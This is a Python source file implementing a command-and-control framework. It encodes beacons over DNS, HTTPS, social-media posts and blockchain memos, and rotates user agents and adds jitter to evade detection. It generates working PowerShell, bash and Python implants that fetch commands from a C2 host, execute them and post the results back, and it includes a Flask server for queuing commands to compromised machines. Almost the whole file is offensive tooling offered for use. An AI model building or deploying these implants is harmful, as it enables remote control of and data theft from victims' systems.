import base64
import hashlib
import json
import random
import string
import time


class C2Channel:
    CHANNEL_TYPES = ["dns", "http", "https", "social", "blockchain", "icmp", "websocket", "tor"]

    def __init__(self, channel_type="dns", c2_domain="c2.example.com", beacon_interval=60):
        self.channel_type = channel_type
        self.c2_domain = c2_domain
        self.beacon_interval = beacon_interval
        self.jitter = 0.3
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "curl/8.4.0", "Wget/1.21.4", "Python-urllib/3.12",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        ]
        self.rand = random.Random()
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]
        self.command_queue = []
        self.response_queue = []
        self.beacon_count = 0

    def encode_command(self, command):
        packet = {
            "ver": 1,
            "sid": self.session_id,
            "ts": int(time.time()),
            "cmd": command,
            "seq": self.beacon_count,
        }
        return base64.b64encode(json.dumps(packet).encode()).decode()

    def decode_command(self, encoded):
        try:
            raw = base64.b64decode(encoded)
            return json.loads(raw.decode())
        except Exception:
            return None

    def beacon(self, implant_id="implant-001"):
        self.beacon_count += 1
        beacon_data = {
            "id": implant_id,
            "sid": self.session_id,
            "seq": self.beacon_count,
            "ts": int(time.time()),
            "status": "alive",
            "jitter": self.rand.uniform(-self.jitter, self.jitter),
        }

        if self.channel_type == "dns":
            return self._dns_beacon(beacon_data)
        elif self.channel_type == "http":
            return self._http_beacon(beacon_data)
        elif self.channel_type == "social":
            return self._social_beacon(beacon_data)
        elif self.channel_type == "blockchain":
            return self._blockchain_beacon(beacon_data)
        return self._http_beacon(beacon_data)

    def _dns_beacon(self, data):
        encoded = base64.b32encode(json.dumps(data).encode()).decode().lower().rstrip("=")
        queries = []
        for i in range(0, len(encoded), 32):
            chunk = encoded[i:i+32]
            queries.append(f"{chunk}.beacon.{self.c2_domain}")
        response_q = f"{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.resp.{self.c2_domain}"
        return {
            "type": "dns",
            "queries": queries,
            "response_lookup": response_q,
            "interval": self.beacon_interval,
            "interval_after_jitter": self.beacon_interval * (1 + self.rand.uniform(-self.jitter, self.jitter)),
        }

    def _http_beacon(self, data):
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        ua = self.rand.choice(self.user_agents)
        endpoints = ["/api/health", "/status", "/ping", "/metrics", "/cdn/pixel.png",
                      "/analytics/collect", "/js/beacon.js", "/assets/settings.json",
                      "/v1/heartbeat", "/.well-known/security.txt"]
        methods = ["GET", "POST", "PUT"]
        endpoint = self.rand.choice(endpoints)
        method = self.rand.choice(methods) if data.get("status") == "alive" else "POST"

        headers = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": self.rand.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en;q=0.7"]),
            "Cache-Control": "no-cache",
            "X-Requested-With": "XMLHttpRequest",
            "X-Session-ID": self.session_id,
        }

        if method == "POST":
            headers["Content-Type"] = self.rand.choice(["application/json", "text/plain", "application/x-www-form-urlencoded"])

        return {
            "type": "http",
            "method": method,
            "url": f"https://{self.c2_domain}{endpoint}",
            "headers": headers,
            "body": encoded if method == "POST" else None,
            "interval": self.beacon_interval,
        }

    def _social_beacon(self, data):
        platforms = ["twitter", "reddit", "github", "linkedin", "mastodon"]
        platform = self.rand.choice(platforms)
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        payloads = {
            "twitter": f"Just hit {self.rand.randint(100,999)} commits! #{self.rand.choice(['dev','coding','build','ship'])} {encoded[:50]}...",
            "reddit": f"I've been working with {self.rand.choice(['Kubernetes', 'Rust', 'Go', 'Python', 'AWS'])} and {encoded[:40]}...",
            "github": f"Update {self.rand.randint(1,999)}: {hashlib.md5(encoded.encode()).hexdigest()[:8]}",
            "linkedin": f"Excited to share our latest {self.rand.choice(['research', 'findings', 'update'])}: {encoded[:50]}",
            "mastodon": f"Testing new {self.rand.choice(['framework', 'tool', 'pipeline'])} build {self.rand.randint(1,999)} #{self.rand.choice(['infosec', 'dev', 'cloud'])}",
        }
        return {
            "type": "social",
            "platform": platform,
            "post_content": payloads.get(platform, encoded[:200]),
            "interval": self.beacon_interval * 5,
        }

    def _blockchain_beacon(self, data):
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        tx_comment = f"Payment ref {hashlib.md5(encoded.encode()).hexdigest()[:10]} for invoice #{self.rand.randint(10000,99999)}"
        return {
            "type": "blockchain",
            "network": self.rand.choice(["ethereum", "bitcoin", "solana", "polygon"]),
            "transaction_memo": tx_comment,
            "encoded_data": encoded[:100],
            "interval": self.beacon_interval * 10,
        }

    def generate_c2_payload(self, implant_type="powershell"):
        host = self.c2_domain
        sid = self.session_id
        interval = self.beacon_interval

        if implant_type == "powershell":
            return f"""$c2 = '{host}'; $sid = '{sid}'; $int = {interval}
while ($true) {{
    try {{
        $r = Invoke-WebRequest -Uri "https://$c2/beacon/$sid" -Method GET -UseBasicParsing
        if ($r.Content) {{
            $cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.Content))
            $result = iex $cmd 2>&1 | Out-String
            $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result))
            Invoke-WebRequest -Uri "https://$c2/result/$sid" -Method POST -Body $enc -UseBasicParsing
        }}
    }} catch {{ }}
    Start-Sleep -Seconds $int
}}"""

        elif implant_type == "bash":
            return f"""#!/bin/bash
C2="{host}"
SID="{sid}"
INT={interval}
while true; do
    RES=$(curl -s "https://$C2/beacon/$SID" 2>/dev/null)
    if [ -n "$RES" ]; then
        CMD=$(echo "$RES" | base64 -d 2>/dev/null)
        if [ -n "$CMD" ]; then
            OUTPUT=$(eval "$CMD" 2>&1 | base64 -w0)
            curl -s -X POST "https://$C2/result/$SID" -d "$OUTPUT" >/dev/null 2>&1
        fi
    fi
    sleep $((INT + RANDOM % 30))
done"""

        elif implant_type == "python":
            return f'''import threading, requests, base64, time, subprocess, sys

C2 = "{host}"
SID = "{sid}"
INTERVAL = {interval}

def beacon():
    while True:
        try:
            r = requests.get(f"https://{{C2}}/beacon/{{SID}}", timeout=10)
            if r.status_code == 200 and r.text:
                cmd = base64.b64decode(r.text).decode()
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                output = base64.b64encode((result.stdout + result.stderr).encode()).decode()
                requests.post(f"https://{{C2}}/result/{{SID}}", data=output, timeout=10)
        except Exception:
            pass
        time.sleep(INTERVAL)

t = threading.Thread(target=beacon, daemon=True)
t.start()'''

        return f"# Unknown implant type: {implant_type}"

    def generate_c2_server(self, framework="flask"):
        if framework == "flask":
            return f'''from flask import Flask, request, jsonify
import base64, json, os, threading, time

app = Flask(__name__)
C2_DOMAIN = "{self.c2_domain}"
SESSIONS = {{}}
CMDS = {{}}  # sid -> [pending commands]

@app.route("/beacon/<sid>", methods=["GET"])
def beacon(sid):
    if sid not in SESSIONS:
        SESSIONS[sid] = {{"first_seen": time.time(), "last_seen": time.time(), "commands_sent": 0}}
        CMDS[sid] = []
    SESSIONS[sid]["last_seen"] = time.time()
    if CMDS[sid]:
        cmd = CMDS[sid].pop(0)
        return base64.b64encode(cmd.encode()).decode()
    return "", 204

@app.route("/result/<sid>", methods=["POST"])
def result(sid):
    data = request.data.decode()
    if sid in SESSIONS:
        SESSIONS[sid]["last_output"] = base64.b64decode(data).decode(errors="replace")
    return "OK", 200

@app.route("/admin/send/<sid>", methods=["POST"])
def send_cmd(sid):
    cmd = request.json.get("cmd", "whoami")
    if sid not in CMDS:
        CMDS[sid] = []
    CMDS[sid].append(cmd)
    return jsonify({{"queued": True, "sid": sid, "cmd": cmd}})

@app.route("/admin/sessions", methods=["GET"])
def list_sessions():
    return jsonify({{sid: info for sid, info in SESSIONS.items()}})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem", "key.pem"))
'''
        return f"# Unknown framework: {framework}"

    def channel_info(self):
        infos = {
            "dns": "DNS tunneling: encode commands in subdomain queries, responses in TXT records. Stealthy but slow. Best for air-gapped exfil.",
            "http": "HTTPS beaconing: looks like normal API traffic. Configurable endpoints, user-agent rotation, jitter. Best general-purpose C2.",
            "https": "Same as HTTP with TLS. Encrypted payloads blend with legitimate traffic.",
            "social": "Social media C2: post encoded beacons as tweets/comments/comments. Decentralized, hard to takedown. High latency.",
            "blockchain": "Blockchain C2: embed commands in transaction memos. Immutable, public, anonymous. Very high latency.",
            "icmp": "ICMP tunneling: hide data in echo request/reply packets. Good for networks with restrictive egress.",
            "websocket": "WebSocket C2: persistent bidirectional channel over ws://. Low latency, real-time.",
            "tor": "Onion routing: route C2 through Tor network. Maximum anonymity, high latency.",
        }
        return {**infos}

    def generate_channel_config(self, channel_type=None):
        ct = channel_type or self.channel_type
        config = {
            "type": ct,
            "domain": self.c2_domain,
            "interval": self.beacon_interval,
            "jitter": self.jitter,
            "session_id": self.session_id,
            "user_agents": self.user_agents[:3],
        }
        if ct == "dns":
            config["dns_server"] = f"ns1.{self.c2_domain}"
        elif ct == "social":
            config["platforms"] = ["twitter", "reddit", "github"]
            config["accounts"] = {"twitter": "@beacon_{}".format(hashlib.md5(str(time.time()).encode()).hexdigest()[:8])}
        elif ct == "blockchain":
            config["network"] = "ethereum"
            config["contract"] = f"0x{hashlib.sha256(self.c2_domain.encode()).hexdigest()[:40]}"
        return json.dumps(config, indent=2)
